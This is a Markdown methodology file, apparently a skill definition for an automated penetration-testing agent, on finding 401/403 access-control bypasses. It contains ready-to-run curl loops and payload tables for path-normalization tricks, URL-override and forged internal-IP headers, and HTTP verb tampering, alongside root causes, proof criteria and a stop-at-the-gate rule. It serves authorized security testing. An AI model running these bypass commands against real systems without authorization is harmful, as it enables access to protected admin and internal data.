---
name: 403-bypass
description: >
  Hunt for access-control bypasses on endpoints that return 401/403 — reaching a gated route by
  exploiting a mismatch between the component that enforces the control and the one that routes the
  request. Covers path/case/encoding tricks (/admin//, /admin/., %2e, ..;/, trailing chars),
  override headers (X-Original-URL, X-Rewrite-URL, X-Forwarded-For, X-Custom-IP-Authorization,
  X-Forwarded-Host), HTTP verb tampering (GET vs POST/HEAD/arbitrary), and protocol/casing quirks.
  Use when a known or guessed path returns 401/403 and you want to confirm the deny is enforced
  consistently. Keywords: 403 bypass, 401 bypass, forbidden bypass, acl bypass, path normalization,
  X-Original-URL, X-Rewrite-URL, verb tampering, ..;/, %2e, double slash, trailing dot, unicode
  path, header override.
  Do NOT use for IDOR/object-level authz (use idor / broken-access-control) or IP-trust logic
  alone (use host-header / nodejs). This is route-level 401/403 enforcement bypass.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-288, CWE-284, CWE-287, CWE-436]
  mitre_attack: [T1190, T1133]
  tools: [curl, ffuf, byp4xx, nomore403, burp]
depends_on: [active-recon, web-crawling, fuzzing]
feeds_into: [chain-analysis, broken-access-control, info-disclosure]
chains_with: [broken-access-control, auth-bypass, idor, info-disclosure, parser-desync]
---

## Signals

- A path returns 401/403 (or a redirect to login) while clearly existing (different from a 404):
  `/admin`, `/actuator/env`, `/api/internal`, `/manager/html`, `/.git/config`.
- A reverse proxy / WAF / gateway sits in front (CDN headers, `Via`, `Server` mismatch between
  edge and origin) — a classic source of enforcement-vs-routing desync.
- Framework or proxy known to support URL-override headers (some IIS/ASP setups honor
  `X-Original-URL`/`X-Rewrite-URL`; load balancers honor `X-Forwarded-*`).
- Inconsistent 403 behaviour: `/admin` is 403 but `/admin/` or `/ADMIN` behaves differently —
  normalization mismatch smell.
- An ACL that denies by exact path/method (`deny GET /admin`) rather than by resource — verb or
  path-shape changes may slip past.

## Prerequisites

- A concrete endpoint returning 401/403 and a reliable baseline (status, body length, a marker
  string) to compare every variant against.
- Knowledge of the stack where possible (proxy + origin) — many bypasses exploit a *specific*
  normalization difference, so fingerprinting narrows the payload family.
- Care to distinguish a real bypass (gated content returned) from a decoy (200 with an empty/error
  body, a login page, or a generic "forbidden" rendered with 200).

## Methodology

1. **Establish the baseline.** Pin the exact deny response so you can tell a real bypass from noise:
   ```bash
   curl -s -o /dev/null -w "status=%{http_code} len=%{size_download}\n" https://target/admin
   curl -s https://target/admin | head -c 200     # capture the forbidden body/marker
   ```
   Record status + body length + a marker. A "bypass" that returns 200 with the same forbidden
   body is NOT a bypass.

2. **Path normalization / shape tricks.** The proxy denies `/admin` but the origin may normalize a
   variant back to it after the ACL ran:
   ```bash
   for p in \
     /admin/ /admin// /admin/. '/admin/./' /./admin /admin/..;/ '/admin..;/' \
     /admin%20 /admin%09 /admin%00 /admin.json /admin.html /admin/~ \
     /%2e/admin /admin%2f /admin%2e /ADMIN /Admin /admin/* '/admin?' '/admin#'; do
     code=$(curl -s -o /dev/null -w "%{http_code}" --path-as-is "https://target$p")
     echo "$code  $p"
   done
   ```
   `--path-as-is` is essential (curl otherwise collapses `../` and `//`). Any variant returning the
   gated content (not the forbidden marker) is a candidate — verify the body.

3. **Encoding / traversal normalization.** Encode the separator or segment so the ACL sees a
   different string than the router resolves:
   ```bash
   for p in \
     /%61dmin /adm%69n /admin%2f. /admin/%2e /%2e%2e/admin \
     /..%2fadmin /..%2f..%2fadmin /admin%252f /admin%c0%af /admin%u002f \
     '/admin/..;/admin' /;/admin /admin;/ /admin/;/; do
     echo "$(curl -s -o /dev/null -w '%{http_code}' --path-as-is "https://target$p")  $p"
   done
   ```
   `..;/` (Tomcat path-param), `%2e`, double/overlong encoding, and matrix `;` params are the
   classic proxy-vs-origin splits.

4. **URL-override / rewrite headers.** Some stacks route by a header value while the ACL matched the
   real path — point the header at the gated route while the request line hits an allowed one:
   ```bash
   curl -s -o /dev/null -w "%{http_code}\n" https://target/anything -H 'X-Original-URL: /admin'
   curl -s -o /dev/null -w "%{http_code}\n" https://target/anything -H 'X-Rewrite-URL: /admin'
   curl -s -o /dev/null -w "%{http_code}\n" https://target/ -H 'X-Original-URL: /admin/env'
   # also test the gated path with an allowed-looking override:
   curl -s -o /dev/null -w "%{http_code}\n" https://target/admin -H 'X-Original-URL: /public'
   ```
   A 200 with admin content via `/anything` + `X-Original-URL: /admin` is a clean bypass.

5. **IP-trust / forwarded headers.** Where the deny is "allow only internal/office IPs", forge the
   client address the ACL reads:
   ```bash
   for h in \
     'X-Forwarded-For: 127.0.0.1' 'X-Forwarded-For: 10.0.0.1' 'X-Real-IP: 127.0.0.1' \
     'X-Custom-IP-Authorization: 127.0.0.1' 'X-Originating-IP: 127.0.0.1' \
     'X-Client-IP: 127.0.0.1' 'X-Forwarded-Host: localhost' 'Forwarded: for=127.0.0.1'; do
     echo "$(curl -s -o /dev/null -w '%{http_code}' https://target/admin -H "$h")  $h"
   done
   ```
   Compare to baseline; an allowlisted route opening on a forged internal IP is the finding
   (overlaps host-header / nodejs trust-proxy).

6. **HTTP verb / method tampering.** An ACL scoped to `GET` may ignore `POST`, `HEAD`, `PUT`,
   `OPTIONS`, or an arbitrary method the framework maps to the same handler:
   ```bash
   for m in GET POST HEAD PUT OPTIONS PATCH TRACE FAKEMETHOD; do
     echo "$m -> $(curl -s -o /dev/null -w '%{http_code}' -X "$m" https://target/admin)"
   done
   # also try method-override headers if the app honors them:
   curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target/admin -H 'X-HTTP-Method-Override: GET'
   ```
   A method that returns the gated content (or performs the action) while `GET` is 403 is a verb
   bypass. `HEAD` returning 200 headers hints the body handler runs without the GET ACL.

7. **Confirm it's a real bypass, then stop at the gate.** Verify the response is the *gated
   resource*, not a 200 error/login/empty page. Acting on what the bypass exposes (changing admin
   state, reading another tenant's data) is a Human-gate / new-scope action.

## Tooling

- `curl --path-as-is` / Burp Repeater — the only reliable way to send raw path shapes without
  client-side normalization.
- `ffuf` — fuzz the variant list across many endpoints (`-w variants.txt -u https://target/adminFUZZ`).
- `byp4xx` / `nomore403` — automated 401/403 bypass sweeps (verify flags with `-h`; confirm every
  hit manually — these tools over-report on status alone).
- Burp "Match & Replace" / Intruder — bulk header and method permutations.
- A diffing step (status + length + marker) to separate real bypasses from decoy 200s.

## Root Causes

- Enforcement and routing done by different components that normalize URLs differently (proxy ACL
  vs. origin router) — the ACL matches one string, the handler resolves another.
- Access control keyed on an exact path/method string rather than the resolved resource and all
  its methods (deny-by-pattern instead of allow-by-resource).
- Trusting request-supplied routing/identity headers (`X-Original-URL`, `X-Rewrite-URL`,
  `X-Forwarded-For`) that the edge should strip.
- Framework path features (matrix `;` params, `..;/`, trailing dot/slash, case-insensitive FS)
  that the security filter doesn't account for.
- Inconsistent method handling: a handler reachable by verbs the ACL never considered.

## Validation Gate (minimum proof)

- **Demonstrated:** a variant (path shape, encoding, override header, forged IP, or method) returns
  the actual gated content or performs the gated action, verified against the forbidden baseline by
  body/marker — not just a 200 status. Request + response (showing the gated content) included.
- **Inferred:** a variant returns 200 with a different length than the 403 baseline but the body is
  ambiguous (partial render, redirect) — enforcement looks inconsistent but the gated resource not
  yet confirmed; or a header flips the status on a route whose sensitivity is unconfirmed.
- **Unproven:** "`/admin//` returns 200" where that 200 is an empty page, a login redirect, or the
  same forbidden text rendered with 200. Do not report — a status change without gated content is
  not a bypass.
- Name the exact bypass mechanism (which variant/header/method) and the normalization mismatch it
  exploits — remediation is specific (fix the normalizer, strip the header, scope the ACL to the
  resource).

## Payloads & Detection Patterns

Guía de caza: una familia por tipo de desync. El gate real es contenido: un cambio de status sin el
recurso protegido NO es bypass — compara siempre contra el baseline 403.

| Categoría | Shape | Propósito |
|---|---|---|
| Path shape | `/admin/`, `/admin//`, `/admin/.`, `/admin/..;/`, `/admin%20` | Normalización proxy≠origin |
| Encoding | `/%61dmin`, `/admin%2f.`, `/..%2fadmin`, `/admin%252f`, `%2e` | ACL ve string distinto al router |
| Matrix/param | `/admin;/`, `/;/admin`, `/admin/..;/admin` | Path-params Tomcat/Java |
| Override header | `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` | Routing por header ≠ path del ACL |
| IP trust | `X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1` | Forjar origen interno permitido |
| Host override | `X-Forwarded-Host: localhost`, `X-Forwarded-Host: internal` | Vhost/ACL por host confiado |
| Verb tampering | `-X POST/HEAD/PUT/OPTIONS`, `X-HTTP-Method-Override` | ACL scopeada a un solo método |
| Case | `/ADMIN`, `/Admin` | FS/router case-insensitive, ACL case-sensitive |

Surface signals que delatan la clase antes de inyectar:
- URL: un path existente que da 401/403 (≠404); diferencias de status entre `/x` y `/x/`.
- Headers: presencia de un proxy/CDN delante (`Via`, `Server`/`X-Cache` edge≠origin), stacks que
  históricamente honran `X-Original-URL` (IIS/ASP).
- Comportamiento: `/x` 403 pero `/X` o `/x//` distinto = olor a mismatch de normalización.

```bash
# baseline obligatorio: status + longitud + marcador del 403
curl -s -o /tmp/b403 -w "base status=%{http_code} len=%{size_download}\n" https://target/admin
marker=$(head -c 60 /tmp/b403)
```

```bash
# barrido de path shapes comparando longitud/estado contra el baseline
for p in /admin/ /admin// /admin/. '/admin/..;/' /%2e/admin /..%2fadmin /ADMIN /admin%20; do
  out=$(curl -s -o /tmp/v -w "%{http_code} %{size_download}" --path-as-is "https://target$p")
  echo "$out  $p  $(head -c 30 /tmp/v | tr -d '\n')"
done   # un status 200 con longitud/cuerpo distintos al baseline = candidato, verificar contenido
```

```bash
# headers de override y de IP (comparar contra baseline 403)
for h in 'X-Original-URL: /admin' 'X-Rewrite-URL: /admin' 'X-Forwarded-For: 127.0.0.1' \
         'X-Custom-IP-Authorization: 127.0.0.1'; do
  echo "$(curl -s -o /dev/null -w '%{http_code}' https://target/anything -H "$h")  [$h]"
done
```

## Bypass Techniques

Agrupadas por la defensa que evaden; probar la familia completa antes de declarar no-vulnerable.

| Filtro evadido | Técnica | Notas |
|---|---|---|
| ACL por path exacto | Trailing `/`, `//`, `/.`, `/..;/`, `%20`/`%09`/`%00`, extensión `.json`/`.html` | El origin re-normaliza a la ruta tras el ACL |
| ACL ve el path decodificado una vez | Doble-encode `%252f`, overlong `%c0%af`, `%u002f` | El proxy y el origin decodifican distinto |
| Deny por método | `POST/HEAD/PUT/OPTIONS`, método arbitrario, `X-HTTP-Method-Override` | El handler corre bajo un verbo no cubierto |
| Routing por path del request | `X-Original-URL`/`X-Rewrite-URL` apuntando al recurso gated | Solo en stacks que honran el header |
| Allowlist por IP | `X-Forwarded-For`/`X-Real-IP`/`X-Custom-IP-Authorization` = IP interna | Depende de `trust proxy`/orden de hops |
| Vhost/host ACL | `X-Forwarded-Host`/`Host` interno | Puede exponer panel por host de admin |
| Match case-sensitive | `/ADMIN`, mezcla de mayúsculas | Router/FS case-insensitive, ACL no |

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Bypass → broken-access-control** — Does the reached route expose admin functions, other
   tenants' data, or internal management? Chain broken-access-control.
2. **Bypass → info-disclosure** — Reaching `/actuator/env`, `/.git`, `/trace.axd`, backups? Chain
   the relevant framework/info-disclosure finding.
3. **Same mismatch elsewhere** — Does the winning normalization trick open other 403 paths across
   the app? One desync usually generalizes.
4. **Proxy-vs-origin desync** — Is the normalization gap also a request-smuggling / cache-poisoning
   surface? Chain parser-desync / http-smuggling / cache-poisoning.
5. **Bypass → state change** — If a verb/override reaches a mutating endpoint, that is a gated
   action — confirm scope before triggering it.

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- 403 bypass → **broken-access-control** → admin functionality / cross-tenant data.
- 403 bypass reaching a framework endpoint → **info-disclosure** (springboot `/actuator/env`,
  aspnet `trace.axd`, laravel `/telescope`).
- Override-header bypass → **auth-bypass** (reach authenticated-only routes without a session).
- Path-normalization mismatch → **parser-desync** / **http-smuggling** / **cache-poisoning** (the
  same proxy≠origin gap).
- Bypass + **idor** — once the gated listing is reachable, object-level enumeration follows.

## Gotchas

- **Status change ≠ bypass.** A 200 that returns a login page, an empty body, a redirect, or the
  same "forbidden" text is not a bypass. Always diff the body/marker against the 403 baseline and
  confirm the gated *content* is present.
- **Use `--path-as-is`.** Without it, curl collapses `//`, `/./`, and `../` before sending, so you
  test a different path than you think and miss real bypasses (or report false ones).
- **Override headers are stack-specific.** `X-Original-URL`/`X-Rewrite-URL` only work where the
  stack honors them; a 403→200 flip could also be the WAF blocking the header route differently —
  verify gated content, not just the code.
- **IP-forwarding bypass depends on `trust proxy`.** The real edge may overwrite your forged
  `X-Forwarded-For`; test prepend vs. append and confirm the ACL decision actually moved (overlaps
  host-header / nodejs).
- **Tool over-reporting.** `byp4xx`/`nomore403` flag on status alone; every hit needs manual body
  confirmation before it becomes a finding.
- **Minimum proof, not exploitation.** Reaching the gated route is the finding; using it to change
  admin state or read other tenants' data is a new scope boundary — stop and get the operator gate.
